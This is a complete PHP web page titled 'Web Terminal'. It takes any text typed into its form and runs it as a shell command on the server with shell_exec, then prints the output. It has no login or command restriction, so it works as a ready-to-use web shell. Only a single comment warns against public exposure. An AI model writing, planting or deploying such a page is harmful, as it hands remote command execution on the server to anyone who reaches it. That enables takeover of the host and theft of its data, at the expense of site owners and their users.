<!DOCTYPE html>
<html>
<head>
    <title>Web Terminal</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: monospace; padding: 20px; }
        input, button { background: #222; color: #0f0; border: 1px solid #0f0; padding: 5px; }
        .output { white-space: pre; margin-top: 10px; }
    </style>
</head>
<body>
    <h2>Web Terminal</h2>
    <form method="post">
        <label>$ </label>
        <input type="text" name="cmd" autofocus style="width: 80%;" />
        <button type="submit">Run</button>
    </form>

    <div class="output">
        <?php
        if ($_SERVER["REQUEST_METHOD"] == "POST" && !empty($_POST['cmd'])) {
            $cmd = $_POST['cmd'];

            // WARNING: This executes arbitrary commands - NEVER expose to public!
            $output = shell_exec($cmd . ' 2>&1');
            echo htmlspecialchars("$cmd\n$output");
        }
        ?>
    </div>
</body>
</html>